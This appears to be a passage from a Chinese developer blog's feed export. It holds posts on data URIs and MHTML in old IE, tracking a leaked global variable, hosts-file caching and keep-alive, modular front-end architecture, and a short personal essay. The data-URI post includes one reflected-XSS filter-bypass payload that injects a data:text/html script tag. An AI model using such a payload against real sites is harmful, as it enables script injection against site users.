"Multipurpose Internet Mail Extensions HyperText Markup Language" 的简称，它就像一个带着附件的邮件一般，如下所示：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** FilePath: http://example.com/test.css */</span></span><br><span class="line"><span class="comment">/*!@ignore</span></span><br><span class="line"><span class="comment">Content-Type: multipart/related; boundary=&quot;_ANY_SEPARATOR&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--_ANY_SEPARATOR</span></span><br><span class="line"><span class="comment">Content-Location:myidBackground</span></span><br><span class="line"><span class="comment">Content-Transfer-Encoding:base64</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==</span></span><br><span class="line"><span class="comment">--_ANY_SEPARATOR--</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.myid</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==&quot;</span>);</span><br><span class="line">  *<span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">mhtml:http://example.com/test.css!myidBackground</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>上方的一串注释就像是一个附件，这个附件内容是一个名叫 </span><code>myidBackground</code><span> 的 </span><code>base64</code><span> 编码图片，在一个 class 叫做 </span><code>myid</code><span> 的 css 中用到了它。这里有几点需要注意：</span></p><ul><li><code>_ANY_SEPARATOR</code> 可以是任意内容</li><li>在"附件"结束位置需要加上结束符 <code>_ANY_SEPARATOR</code>，否则在 Vista 和 Win7 的 IE7 中会<a href="http://www.phpied.com/the-proper-mhtml-syntax/">出错</a>。</li><li>附件代码注意不要被压缩工具给干掉了</li></ul><p><strong>这里存在一个坑：部分系统兼容模式下的 IE8 也认识 css 中的 hack 符号 <code>*</code>，但是不支持 <code>mhtml</code>，所以上面的内容不会生效。处理方案估计就只有使用 IE 的条件注释了。</strong></p><h3 id="https"><a class="headeranchor-link" name="user-content-https" href="#https"></a>HTTPS 下的安全提示</h3><p>HTTPS 打开页面，当在 IE6、7 下使用 data URIs 时，会看到如下提醒：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/120937285514109.png" alt=""></p><p>MS 的解释是：</p><blockquote><p>您正在查看的网站是个安全网站。它使用了 SSL （安全套接字层）或 PCT（保密通讯技术）这样的安全协议来确保您所收发信息的安全性。 当站点使用安全协议时，您提供的信息例如姓名或信用卡号码等都经过加密，其他人无法读取。然而，这个网页同时包含<strong>未使用该安全协议的项目</strong>。 </p></blockquote><p>很明显，IE 嗅到了"未使用安全协议的项目"。</p><p>浏览器在解析到一个 URI 的时候，会首先判断协议头，如果是以 <code>http(s)</code> 开头，它便会建立一个网络链接下载资源，如果它发现协议头为 <code>data:</code>，便会将其作为一个 Data URI 资源进行解析。</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/120937376765288.png" alt=""></p><p>但是从 chrome 的瀑布流，我们可以做这样的猜测：</p><p>图中每个 Data URI 都发起了请求，不过状态都是 <code>data(from cache)</code>，禁用缓存之后，依然如此。所以可以断定，浏览器在下载源码解析成 DOM 的时候，会将 Data URI 的资源解析出来，并缓存在本地，最后 Data URI 每个对应位置都会发起一次请求，只是这个请求还未建立链接，就被发现存在缓存的浏览器给拍死了。</p><h3 id="_3"><a class="headeranchor-link" name="user-content-_3" href="#_3"></a>安全阀门</h3><p>Data URI 在 IE 下有诸多安全限制，事实上，很多 xss 注入也可以将 data URI 的源头作为入口，使用 data URI 绕过浏览器的过滤。</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> 绕过浏览器过滤</span><br><span class="line">http:<span class="regexp">//</span>example.com<span class="regexp">/text.php?t=&quot;&gt;&lt;script src=&quot;data:text/</span>html,&lt;script&gt;alert(<span class="string">&quot; xss&quot;</span>)&lt;=<span class="string">&quot;&quot;</span> script=<span class="string">&quot;&quot;</span>&gt;&lt;!--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></script></p><p>这里可以很大程度的发散，很有意思，值得读者去深究。</p><h3 id="_4"><a class="headeranchor-link" name="user-content-_4" href="#_4"></a>扩展阅读</h3><ul><li><a href="http://www.ietf.org/rfc/rfc2397.txt">RFC 2397</a> RFC文档</li><li><a href="//developer.mozilla.org/zh-CN/docs/data_URIs">MDN - data_URIs</a> MDN文档</li><li><a href="//msdn.microsoft.com/en-us/library/cc848897(VS.85).aspx">MSDN - data Protocal</a> MSDN文档</li><li><a href="http://www.nczonline.net/blog/2009/10/27/data-uris-explained/">NC - data_uris_explained</a></li><li><a href="http://www.phpied.com/mhtml-when-you-need-data-uris-in-ie7-and-under/">phpied - MHTML</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何快速定位不小心暴露到全局的变量</title>
      <link href="/blog/2015/07/09/cb-window-var/"/>
      <url>/blog/2015/07/09/cb-window-var/</url>
      
        <content type="html"><![CDATA[<p>今天在查看页面控制台的时候，无意中看到了一个暴露到全局的变量 i，全局变量是不会被压缩工具压缩成简写的字母，这个被频繁使用的变量名暴露到全局也是个相当大的隐患，可能一个不小心就覆盖了第二次暴露到全局的同名变量。</p><p>刚开始我就怀疑是自己出现了这样愚蠢的错误：</p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">function <span class="selector-tag">A</span>() &#123;</span><br><span class="line">    <span class="comment">// 在一个函数中多次用到了 for 循环，为了节省变量，都是用了变量 i</span></span><br><span class="line">    <span class="built_in">for</span>(var i = <span class="number">0</span>; ...) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">for</span>(i = <span class="number">0</span>; ...) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">for</span>(i = <span class="number">0</span>; ...) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果在某次拆分函数的时候，忘记定义:</p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">function <span class="selector-tag">A</span>()&#123;</span><br><span class="line">    <span class="built_in">for</span>(var i = <span class="number">0</span>; ...) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">for</span>(i = <span class="number">0</span>; ...) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function <span class="selector-tag">B</span>()&#123;</span><br><span class="line">    <span class="built_in">for</span>(i = <span class="number">0</span>; ...) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个时候，变量 i 在 B 函数执行的时候就暴露到了全局。抱着这样的怀疑，我搜索了 50 多个模块的代码，一无所获...此时，我依然十分怀疑是自己的程序哪里疏忽了，全局搜索 <code class="highlight">i =</code> 和 <code class="highlight">i++</code>，五分钟过去了，未果...</p><h3 id="">找到这个变量</h3><p>如果这个变量名叫做 <code class="highlight">fuckIE</code>，分分钟全局搜索就出来了，类似这种简短的常用的变量，着实让人头疼了好一会儿。后来想到了这个方案：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">window</span>, <span class="string">&quot;i&quot;</span>, &#123;</span><br><span class="line">    get : <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">i</span>; &#125;,</span><br><span class="line">    set : <span class="keyword">function</span>(<span class="params">newValue</span>)&#123; <span class="keyword">debugger</span>;<span class="variable language_">window</span>.<span class="property">i</span> = newValue; &#125;,</span><br><span class="line">    enumerable : <span class="literal">true</span>,</span><br><span class="line">    configurable : <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在全局定义变量 i 的时刻，打一个断点，然后 F10 往前走一步，果然，在控制台右侧的 Call Stack 中找到了端倪！</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201507/091139059868960.png" alt="" width="728" height="297"></p><p>这个变量是从第三方组件中（offline组件，使用相当频繁的一个组件）暴露出来的，估计出错的方式同我上面的描述差不多，拆分函数的时候忘记重新定义变量 i。</p><p>当然还有更快的方式：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">__defineSetter__</span>(<span class="string">&#x27;i&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="keyword">debugger</span> &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="">不挖坑才是最好的解决方案</h3><p><strong>1. 使用 <code class="highlight">use strict;</code></strong></p><p>在严格模式下，这种问题暴露无遗，每个函数内都加上 <code class="highlight">use strict;</code>，虽然在语言上有所限制，但是低级错误一定不会出现，因为严格模式会给你报错！</p><p><strong>2. 使用 jslint/jshint 等 js 分析工具</strong></p><p>这些东西除了配置上较为繁琐，用起来还是很顺手的，做过配置的错误都会直接在 IDE 上标红显示出来，很容易发现问题，但是不建议一个项目中途使用，因为代码习惯的问题，很多地方被 js 分析工具作为错误抛出来，改动量是相当大的。</p><p>我有次也犯了个比较隐晦的错误：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">evt</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> target = event.<span class="property">target</span>.<span class="property">nodeName</span>.<span class="title function_">toLowerCase</span>();</span><br><span class="line">    <span class="keyword">if</span>(target !== <span class="string">&#x27;ul&#x27;</span>)&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 IE 和 Chrome 下，代码跑得好好的，但是到了测试较少的 FF 下，问题出来了，<code class="highlight">event is not defined.</code>，IE 和 Chrome 是支持 <code class="highlight">window.event</code> 抓取当前事件对象的，而 FF 不支持，所以每次点击页面上都会报错。。。</p><p>诸如此类的问题，在我们的平时编码之中不胜枚举，所以有一个编码规范作为强约束是十分有必要的！</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无题</title>
      <link href="/blog/2015/05/30/%E6%97%A0%E9%A2%98/"/>
      <url>/blog/2015/05/30/%E6%97%A0%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>再过几天，又一波高三的学生就要走进人生的考场了，这一战一定程度决定了未来的发展，祝好！</p><p>五年前，我也像你们一样，忐忑地等待着这一战的到来，十年磨一剑，期盼有一个好看的分数，也能对得起自己付出的努力。但是现实是残酷的，我记得一个数字，中国的大学有 9000 多所，“好大学”有 200 多所，所以到最后 45 个人中只能有一个人“脱颖而出”，剩下的人被分配到的教学资源相对较少。</p><p>高考，就是一个若隐若现的台阶，看见了，你就往上踏了一步，路需要接着走；看不见，脚步依旧不会停息。高考给我的烙印是一个好看的数字：632，仅此而已，因为这个数字，我多了一些更好的选择。对其他人也是一样的，不同的数字通往不同的路，在路上看到不同的风景。而四年之后，似乎也并不是路的终点，它又成了一个让人倍感不安的起点。</p><p>大学出来，已经快一年了。我好像比较喜欢用“出来”这个词来形容毕业，生活有的时候就像一个一个的笼子，从高中被放出来之后，又被装进了大学，大学毕业之后，就被装进了社会，似乎只有童年的无知是美好的。</p><p>人活着需要一个长远的目标。</p><p>一些组织、团体在动员组员做事之前，都会放出一个口号，树立一个标杆。活着也是一样，没有一个方向，就会瞎窜，走在路上，发现自己偏离了轨道，然后伫足反思，接着继续瞎窜。好多人都是这样。</p><hr><p>（未完，P.S. 今天骑电驴摔了，好惨…）</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修改Hosts为何不生效，是DNS缓存？</title>
      <link href="/blog/2015/05/11/cb-hosts-modify/"/>
      <url>/blog/2015/05/11/cb-hosts-modify/</url>
      
        <content type="html"><![CDATA[<p><strong>Update:</strong></p><ul><li>如果浏览器使用了代理工具，修改 Hosts 也不会生效。这里是因为，浏览器会优先考虑代理工具（如添加 pac 文件、SwitchySharp等）的代理，建议调试的时候先关闭这些代理。</li><li>使用 pac 文件代理有的时候部分文件的代理不生效，应该是 pac 对应的代理服务器上，做了部分处理。</li><li>部分浏览器也有 DNS 缓存，如 chrome(chrome://dns)，这是为什么重启浏览器也不生效的原因，一般设定时间为 60s (如 Firefox)。</li><li>浏览器有DNS缓存，系统也会存在 DNS 缓存，有的时候即便在 chrome://dns 清空了浏览器 DNS 缓存，依然不生效，是因为系统 DNS 缓存还未刷新，刷新方式可以看<a href="http://cnzhx.net/blog/how-to-flush-dns-cache-in-linux-windows-mac/">这篇文章</a>。</li></ul><hr><p>&nbsp;相信很多同学都在使用 SwitchHosts/<a href="http://ihosts.alibaba.net/" target="_blank">iHosts</a>/Gas Mask 等 Hosts 管理工具，当然也有人直接修改 <code>/etc/hosts</code> 或者 <code>system32/drivers/etc/hosts</code> 文件，而经常遇到的疑问是：咿，刚才不是修改并且保存了么，为何 Chrome 浏览器还不生效呢？</p><ul><li>有人说重启下浏览器就好了，</li><li>有人说清空下缓存 DNS（chrome://net-internals/#DNS）就好了，</li><li>有人说隐私模式下打开就好了，</li><li>有人说等一分钟吧...</li></ul><p>结果就是，进入隐私模式的都好了，重启、清空缓存DNS和等一分钟的同学还在继续纠结中。。。</p><p>上面提到的三个工具，SwitchHosts/iHosts/Gas Mask，其实也只有 iHosts 生效了(Mac下)。</p><p>开发过程中我们会无数次的切换 Hosts，如果不知道原理，我们在测试的时候还是很心惊胆战的=_=||</p><h3 id="0">修改Hosts不生效的根本原因</h3><p><strong>因为服务器设置了 <code>keep-alive</code> ！次要原因是存在浏览器 DNS 缓存和系统 DNS 缓存。</strong></p><p>&gt; Keep-alive <a href="http://zh.wikipedia.org/wiki/HTTP%E6%8C%81%E4%B9%85%E8%BF%9E%E6%8E%A5" target="_blank">相关文档</a></p><p>服务器在响应头设置了 <code>Connection: keep-alive</code> （一般的网页都会设置 keep-alive，保持长连接，避免多次连接产生网络消耗）之后，客户端会跟服务器保持长连接，只要长连接不断开，页面在请求的时候就不会重新解析域名！</p><p>我们可以这样来测试：</p><ol><li>打开一个你至少两分钟没有打开的浏览器（你也可以关闭掉你的浏览器，然后重新打开，记得把所有的 tab 都关了，除了当前 tab ^_^）</li><li>在 hosts 添加 <code>127.0.0.1 www.taobao.com</code></li><li>新开 tab，打开 <a href="http://www.taobao.com">www.taobao.com</a>，是不是进不去了 &lt;这里说明 hosts 修改生效了&gt;</li><li>注释掉刚才hosts修改，<code># 127.0.0.1 www.taobao.com</code> ，再打开 <a href="http://www.taobao.com">www.taobao.com</a>，很好，正常打开了 &lt;这里说明 hosts 修改也生效了&gt;</li><li>去掉注释符，<code>127.0.0.1 www.taobao.com</code> ，再打开 <a href="http://www.taobao.com">www.taobao.com</a>，依然可以访问！！！</li><li>Chrome 中进入 chrome://net-internals/#sockets，<img src="https://images.cnitblog.com/blog2015/387325/201505/111045527042806.png" alt="">，可以看到淘宝首页中很多域名都是与服务器保持着长连接，点击上方的 <code>close idle sockets</code> 按钮，可以关闭所有的长连接</li><li>此时，再去访问 <a href="http://www.taobao.com">www.taobao.com</a>，是不是进不去了！</li></ol><h3 id="1">为何一些修改可以让 "Hosts 生效"</h3><h4 id="2">1. 重启浏览器</h4><p>重启浏览器之后，所有的连接（包括长连接）都会断开，自然就生效了</p><h4 id="3">2. 隐私模式打开</h4><p>因为隐私模式下不会复用 TCP 连接，新开连接的时候，会重新解析 DNS 域名，自然也生效了</p><h4 id="4">3. iHosts 管理器在 Mac 下生效</h4><p>因为我在 Windows 下测试过，貌似没有立即生效。问了 iHosts 的作者@必隆，他告诉我，在修改 hosts 文件的时候，会重启网络服务，这个时候必然会断开所有的 TCP 连接（重启网络服务，差不多相当于先断网再联网...)</p><h4 id="5">4. 修改之后，等一会儿...</h4><p>"等一会儿"，要稍微等久一点，<code>keep-alive</code> 的默认设置是 120s，开发者也有可能增大或者减小这个配置，所以"等一会儿"也是很伤神的=。 =</p><p>看到这里，你对其中的原理是否有所了解了呢？</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> hosts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端工程架构探讨</title>
      <link href="/blog/2015/05/03/cb-fe-project/"/>
      <url>/blog/2015/05/03/cb-fe-project/</url>
      
        <content type="html"><![CDATA[<p>回忆一下我们在工程开发中对目录结构的定义，一般分为两种，单页面多模块，多页面多模块。在单页面多模块的工程结构里，我们会考虑模块的复用性，比如：如何将公共的东西（样式、函数等）提取出来方便其他模块复用。在多页面多模块的场景中，也是一样，不过除了把全局共用的样式和方法提取到公共目录外，我们还会将多个地方都会用到的模块作为通用模块处理。</p><h3 id="一、通常开发模式的问题探讨"><a href="#一、通常开发模式的问题探讨" class="headerlink" title="一、通常开发模式的问题探讨"></a>一、通常开发模式的问题探讨</h3><p>下图是一个单页面多模块的工程目录结构图：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── Gruntfile.js</span><br><span class="line">├── package.json</span><br><span class="line">├── build</span><br><span class="line">└── src</span><br><span class="line">    ├── base</span><br><span class="line">    │   ├── base.sass</span><br><span class="line">    │   └── global.js</span><br><span class="line">    ├── mods</span><br><span class="line">    │   ├── preference</span><br><span class="line">    │   │   ├── index.js</span><br><span class="line">    │   │   ├── index.sass</span><br><span class="line">    │   │   └── index.xtpl.html</span><br><span class="line">    │   ├── promo</span><br><span class="line">    │   ├── qr</span><br><span class="line">    │   └── response</span><br><span class="line">    └── index.js</span><br></pre></td></tr></table></figure><p>我们把源码放在 src 文件夹里面，公共的文件（iconfont 、sprite 图片、CSS 和 JS 等）放到 base 目录下，页面中的每个模块都会在 mods 下新建一个文件夹，使用 <code>index.js</code> 来管理模块的渲染。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="title function_">define</span>(<span class="keyword">function</span>(<span class="params"><span class="built_in">require</span></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Lazyload</span> = <span class="built_in">require</span>(<span class="string">&#x27;lazyload&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Preference</span> = <span class="built_in">require</span>(<span class="string">&#x27;./mods/preference/index&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Qr</span> = <span class="built_in">require</span>(<span class="string">&#x27;./mods/qr/index&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Promo</span> = <span class="built_in">require</span>(<span class="string">&#x27;./mods/promo/index&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Response</span> = <span class="built_in">require</span>(<span class="string">&#x27;./mods/response/index&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Response</span>();</span><br><span class="line">    <span class="keyword">if</span>(xxx)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Promo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Lazyload</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Qr</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Preference</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样的工程结构是十分通用，结构也比较清晰的，不过在模块的管理上，这里会存在两个问题：</p><ul><li>AB模块存在较多的共用代码，我们有两种方式处理，一是将公共部分提取出来放到 base 目录下，二是 B 模块直接根据相对路径引用 A 模块。一旦业务上有需求，说 A 模块要下线，那下线之后，第一种方案放置在 base 目录下的代码就不合理了，第二种方案中 B 模块就不能用了，需要将 A 模块的东西部分迁移到 B 模块。</li><li>问题 1 的逆过程：线上目前存在 A 模块，业务上需求需要添加跟 A 模块相似的 B 模块，如果想直接复用 A 模块的代码，一种方式是更小颗粒地分拆 A 模块，然后 B 使用相对路径引用 A，另一种方式是将 A 的共用代码提取出来放到 base 下。两种处理方式都有一定的工作量，而且还会出现问题 1 提到的问题。</li></ul><p>其实说到底还是模块的耦合度过高，只要模块之间存在交集，一个模块的改动就可能会影响到其他模块。多人开发中，这里还存在其他方面的问题：</p><ul><li>并不是每个开发者对接手的项目都有一个全局的把控，下线一个模块时，会不太敢删除 base 目录下跟该模块相关的东西，甚至都不太敢删除这个模块，只是在 <code>index.js</code> 中注释了这个模块的初始化。日积月累，冗余代码便会渗入到项目的各个地方…</li><li>修改一个模块需要编译打包所有的代码，这样的调试效率十分低下，而且这个模块出错，就可能造成整个程序的崩溃。</li><li>代码历史版本管理的颗粒度不够，比如我修改了 A、B、C 三个模块，依次上线了三次，现在要回滚修改 A 的操作，如何处理？如果 ABC 三个模块都能够利用代码管理工具管理代码，那回滚就方便多了。</li></ul><h3 id="二、模块化处理"><a href="#二、模块化处理" class="headerlink" title="二、模块化处理"></a>二、模块化处理</h3><p>去耦合的方式就是让模块之间共用的东西减少，当模块之间不存在共用内容时，耦合度基本就是零了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── init.js</span><br><span class="line">├── build</span><br><span class="line">└── src</span><br><span class="line">    ├── preference &lt;git&gt;</span><br><span class="line">    │   ├── index.js</span><br><span class="line">    │   ├── index.sass</span><br><span class="line">    │   └── index.xtpl.html</span><br><span class="line">    ├── promo &lt;git&gt;</span><br><span class="line">    ├── qr &lt;git&gt;</span><br><span class="line">    └── response &lt;git&gt;</span><br></pre></td></tr></table></figure><p>如上图所示，与之前的结构相比，已经少了很多东西：</p><ul><li><code>index.js</code> 初始化模块的东西不见了，多了一个 <code>init.js</code></li><li><code>base</code> 目录不见了</li><li>每个模块都变成了一个 git 仓库</li></ul><h4 id="1-脚本的初始化"><a href="#1-脚本的初始化" class="headerlink" title="1. 脚本的初始化"></a>1. 脚本的初始化</h4><p>先看看 <code>init.js</code> 在干啥：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// init.js</span></span><br><span class="line"><span class="keyword">var</span> $mods = $(<span class="string">&quot;[tb-mods]&quot;</span>);</span><br><span class="line">$mods.<span class="title function_">each</span>(<span class="title function_">functon</span>(<span class="params">$mod</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($mod.<span class="title function_">attr</span>(<span class="string">&quot;finish&quot;</span>) !== <span class="variable constant_">FINISH_TAG</span>) &#123;</span><br><span class="line">        $mod.<span class="title function_">attr</span>(<span class="string">&quot;finish&quot;</span>, <span class="variable constant_">FINISH_TAG</span>);</span><br><span class="line">        <span class="comment">// 需要懒加载便懒加载</span></span><br><span class="line">        <span class="keyword">if</span>($mod.<span class="title function_">attr</span>(<span class="string">&quot;lazyload&quot;</span>))&#123;</span><br><span class="line">            <span class="title class_">Lazyload</span>($mod);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 否则直接初始化</span></span><br><span class="line">        S.<span class="title function_">use</span>($mod.<span class="title function_">attr</span>(<span class="string">&quot;path&quot;</span>), <span class="keyword">function</span>(<span class="params">S, Mod</span>)&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Mod</span>($mod);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Lazyload</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// code here..</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>init.js</code> 不再对模块进行精确初始化，文档从上往下遍历，找到模块便直接初始化，如果需要懒加载就加入到懒加载队列，开发者不用理会页面上有多少模块，更不用理会各个模块叫做什么名字。</p><p><code>index.js</code> 中 require 很多很多模块，每次添加一个模块或者删除模块都要改动这个文件，而是用 <code>init.js</code> 不会存在这个问题。</p><h4 id="2-模块的版本控制"><a href="#2-模块的版本控制" class="headerlink" title="2. 模块的版本控制"></a>2. 模块的版本控制</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.xtpl.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">tb-mods</span>=<span class="string">&quot;&quot;</span> <span class="attr">lazyload</span>=<span class="string">&quot;&quot;</span> <span class="attr">path</span>=<span class="string">&quot;tb/promo/1.0.0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">tb-mods</span>=<span class="string">&quot;&quot;</span> <span class="attr">lazyload</span>=<span class="string">&quot;&quot;</span> <span class="attr">path</span>=<span class="string">&quot;tb/qr/2.0.0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">tb-mods</span>=<span class="string">&quot;&quot;</span> <span class="attr">lazyload</span>=<span class="string">&quot;&quot;</span> <span class="attr">path</span>=<span class="string">&quot;tb/preference/2.2.1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">tb-mods</span>=<span class="string">&quot;&quot;</span> <span class="attr">path</span>=<span class="string">&quot;tb/response/3.0.2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面上的 DOM 就是标识，存在 DOM 属性标识就执行这个标识对应的脚本，执行顺序就是 DOM 的摆放顺序。</p><p>每个模块代码都使用单个 git 仓库管理，这样能够更好地追踪单个模块的修改记录和版本，也可以解决上面提出的问题（依次修改 ABC 模块，并上线了三次，如果需要回滚 A 模块，则 BC 模块的修改也要跟着滚回去）。</p><h4 id="3-ABTest-需求"><a href="#3-ABTest-需求" class="headerlink" title="3. ABTest 需求"></a>3. ABTest 需求</h4><p>修改一个模块后，只需要修改他在 DOM 的版本号即可上线。如果遇到 ABTest 的需求，那也十分好办了：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.xtpl.html --&gt;</span></span><br><span class="line">&#123;&#123;#if condition&#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">tb-mods</span>=<span class="string">&quot;&quot;</span> <span class="attr">lazyload</span>=<span class="string">&quot;&quot;</span> <span class="attr">path</span>=<span class="string">&quot;tb/promo/1.0.0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;&#123;else&#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">tb-mods</span>=<span class="string">&quot;&quot;</span> <span class="attr">path</span>=<span class="string">&quot;tb/promo/2.0.0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;&#123;/if&#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">tb-mods</span>=<span class="string">&quot;&quot;</span> <span class="attr">lazyload</span>=<span class="string">&quot;&quot;</span> <span class="attr">path</span>=<span class="string">&quot;tb/qr/2.0.0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">tb-mods</span>=<span class="string">&quot;&quot;</span> <span class="attr">path</span>=<span class="string">&quot;tb/response/3.0.2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>tb/promo</code> 目前有两个版本，1.0.0 和 2.0.0，需求是两个版本以 50% 的概率出现，直接在 <code>index.xtpl.html</code> 做如上修改，程序是十分清晰的。</p><h4 id="4-公共文件的处理"><a href="#4-公共文件的处理" class="headerlink" title="4. 公共文件的处理"></a>4. 公共文件的处理</h4><p>那么，公共的代码跑哪里去了？其实我们并不希望有公共的代码产生，上一节中已经提出了耦合给我们带来的维护问题，但是一个项目中必然会有大量可复用的东西，尤其是当页面出现很多相似模块的时候。</p><p><strong>1）模块的复用</strong></p><p>一个模块的渲染，需要两样东西，<code>渲染壳子（模板） + 